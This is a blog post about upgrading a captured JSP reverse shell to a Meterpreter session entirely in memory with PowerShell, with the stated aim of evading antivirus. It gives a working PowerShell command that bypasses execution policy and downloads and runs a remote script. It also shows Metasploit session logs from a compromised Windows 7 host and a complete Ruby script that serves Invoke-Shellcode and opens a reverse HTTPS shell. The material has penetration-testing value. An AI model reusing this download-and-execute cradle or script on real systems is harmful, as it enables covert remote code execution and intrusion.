---
categories:
- metasploit
comments: false
date: "2014-03-10T22:31:47Z"
title: meterpreter shell upgrades using powershell
---

One of my primary goals during development of [clusterd](https://github.com/hatRiot/clusterd) was ensuring reliability and covertness during remote deploys.  It's no secret that antivirus routinely eats vanilla meterpreter shells.  For this, the `--gen-payload` flag generates a war file with `java/jsp_shell_reverse_tcp` tucked inside.  This is used due to it being largely undetected by AV, and our environments are perfectly suited for it.  However, Meterpreter is a fantastic piece of software, and it'd be nice to be able to elevate from this simple JSP shell into it.

Metasploit has a solution for this, sort of.  `sessions -u` can be used to upgrade an existing shell session into a full-blown Meterpreter.  Unfortunately, the current implementation uses `Rex::Exploitation::CmdStagerVBS`, which writes the executable to disk and executes it.  This is almost always immediately popped by most enterprise-grade (and even most consumer grade) AV's.  For this, we need a new solution.

The easiest solution is Powershell; this allows us to execute shellcode completely in-memory, without ever bouncing files against disk.  I used Obscure Security's canonical [post](http://obscuresecurity.blogspot.com/2013/03/powersploit-metasploit-shells.html) on it for my implementation.  The only problem really is portability, as Powershell doesn't exist on Windows XP.  This could be mitigated by patching in shellcode via Java, but that's another post for another time.

Right, so how's this work?  We essentially execute a Powershell command in the running session (our generic shell) that fetches a payload from a remote server and executes it.  Our payload in this case is [Invoke-Shellcode](https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1), from the PowerSploit package.  This bit of code will generate our reverse HTTPS meterpreter shell and inject it into the current process ID.  Our command looks like this:

```
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc %s"
```

Our encoded payload is:

```
iex (New-Object Net.WebClient).DownloadString('http://%s:%s/')
```

IEX, or Invoke-Expression, is just an eval operation.  In this case, we're fetching a URL and executing it.  This is a totally transparent, completely in-memory solution.  Let's have a look at it running:

```
msf exploit(handler) > sessions -l

Active sessions
===============

  Id  Type         Information                                                                       Connection
  --  ----         -----------                                                                       ----------
  1   shell linux  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  192.168.1.6:4444 -> 192.168.1.102:60911 (192.168.1.102)

msf exploit(handler) > 
```

We see above that we currently have a generic shell (it's the java/jsp_shell_reverse_tcp payload) on a Windows 7 system (which happens to be running MSE).  Using this new script, we can upgrade this session to Meterpreter:

```
msf exploit(handler) > sessions -u 1

[*] Started HTTPS reverse handler on https://0.0.0.0:53568/
[*] Starting the payload handler...
[*] 192.168.1.102:60922 Request received for /INITM...
[*] 192.168.1.102:60922 Staging connection for target /INITM received...
[*] Patched user-agent at offset 663128...
[*] Patched transport at offset 662792...
[*] Patched URL at offset 662856...
[*] Patched Expiration Timeout at offset 663728...
[*] Patched Communication Timeout at offset 663732...
[*] Meterpreter session 2 opened (192.168.1.6:53568 -> 192.168.1.102:60922) at 2014-03-11 23:09:36 -0600
msf exploit(handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer        : BRYAN-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64 (Current Process is WOW64)
System Language : en_US
Meterpreter     : x86/win32
meterpreter > 
```

And just like that, without a peep from MSE, we've got a Meterpreter shell.  

You can find the code for this implementation below, though be warned; this is PoC quality code, and probably even worse as I'm not really a Ruby developer.  Meatballs over at Metasploit has a few awesome Powershell pull requests waiting for a merge.  Once this is done, I can implement that here and submit a proper implementation.  If you'd like to try this out, simply create a backup copy of `scripts/shell/spawn_meterpreter.rb` and copy in the following, then `reload`.  You should be upgradin' and bypassin' in no time.

```
#
# Session upgrade using Powershell IEX
# 
# Some code stolen from jduck's original implementation
#
# -drone
#

class HTTPServer
    #
    # Using Ruby HTTPServer here since this isn't a module, and I can't figure
    # out how to use MSF libs in here
    #
    @sent = false
    def state
        return @sent
    end

    def initialize(port, body)
        require 'socket'

        @sent = false
        @server = Thread.new do
            server = TCPServer.open port
            loop do
                client = server.accept
                content_type = "text/plain"
                client.puts "HTTP/1.0 200 OK\r\nContent-type: #{content_type}"\
                            "\r\nContent-Length: #{body.length}\r\n\r\n#{body}"\
                            "\r\n\r\n"
                sleep 5
                client.close
                kill
            end
        end
     end

     def kill!
        @sent = true
        @server.kill
     end

     alias :kill :kill!
end

#
# Returns if a port is used by a session
#
def is_port_used?(port)
    framework.sessions.each do |sid, obj|
       local_info = obj.instance_variable_get(:@local_info)
       return true if local_info =~ /:#{port}$/
    end

    false
end

def start_http_service(port)
    @server = HTTPServer.new(port, @pl)
end

def wait_payload

    waited = 0
    while (not @server.state)
        select(nil, nil, nil, 1)
        waited += 1
        if (waited > 10) # MAGIC NUMBA
            @server.kill
            raise RuntimeError, "No payload requested"
        end
    end
end

def generate(host, port, sport)
    require 'net/http'

    script_block = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/')" % [host, sport]
    cmd = "cmd.exe /c PowerShell.exe -Exec ByPass -Nol %s" % script_block

    # generate powershell payload
    url = URI.parse('https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')
    req = Net::HTTP::Get.new(url.path)
    http = Net::HTTP.new(url.host, url.port)
    http.use_ssl = true

    res = http.request(req)

    if !res or res.code != '200'
      raise RuntimeError, "Could not retrieve Invoke-Shellcode"
    end

    @pl = res.body
    @pl << "\nInvoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force" % [host, port]
    return cmd
end


#
# Mimics what MSF already does if the user doesn't manually select a payload and lhost
#
lhost = framework.datastore['LHOST']
unless lhost
  lhost = Rex::Socket.source_address
end

#
# If there is no LPORT defined in framework, then pick a random one that's not used
# by current sessions. This is possible if the user assumes module datastore options
# are the same as framework datastore options.
#
lport = framework.datastore['LPORT']
unless lport
  lport = 4444 # Default meterpreter port
  while is_port_used?(lport)
    # Pick a port that's not used
    lport = [*49152..65535].sample
  end
end

# do the same from above, but for the server port
sport = [*49152..65535].sample
while is_port_used?(sport)
    sport = [*49152..65535].sample
end

# maybe we want our sessions going to another instance?
use_handler = true
use_handler = nil if (session.exploit_datastore['DisablePayloadHandler'] == true)

#
# Spawn the handler if needed
#
aborted = false
begin

  mh = nil
  payload_name = 'windows/meterpreter/reverse_https'
  if (use_handler)
      mh = framework.modules.create("exploit/multi/handler")
      mh.datastore['LPORT'] = lport
      mh.datastore['LHOST'] = lhost
      mh.datastore['PAYLOAD'] = payload_name
      mh.datastore['ExitOnSession'] = false
      mh.datastore['EXITFUNC'] = 'process'
      mh.exploit_simple(
        'LocalInput'     => session.user_input,
        'LocalOutput'    => session.user_output,
        'Payload'        => payload_name,
        'RunAsJob'       => true)
      # It takes a little time for the resources to get set up, so sleep for
      # a bit to make sure the exploit is fully working.  Without this,
      # mod.get_resource doesn't exist when we need it.
      select(nil, nil, nil, 0.5)
      if framework.jobs[mh.job_id.to_s].nil?
        raise RuntimeError, "Failed to start multi/handler - is it already running?"
      end
    end

    # Generate our command and payload
    cmd = generate(lhost, lport, sport)

    # start http service
    start_http_service(sport)

    sleep 2 # give it a sec to startup

    # execute command
    session.run_cmd(cmd)

    if not @server.state
        # wait...
        wait_payload
    end

rescue ::Interrupt
  # TODO: cleanup partial uploads!
  aborted = true
rescue => e
  print_error("Error: #{e}")
  aborted = true
end

#
# Stop the job
#
if (use_handler)
  Thread.new do
    if not aborted
      # Wait up to 10 seconds for the session to come in..
      select(nil, nil, nil, 10)
    end
    framework.jobs.stop_job(mh.job_id)
  end
end
```


<h3>Update 09/06/2014</h3>
Tom Sellers submitted a PR on 05/29 that implements the above [nicely](https://github.com/rapid7/metasploit-framework/pull/3401).  It appears to support a large swath of platforms, but only a couple support no-disk-write methods, namely the Powershell method.
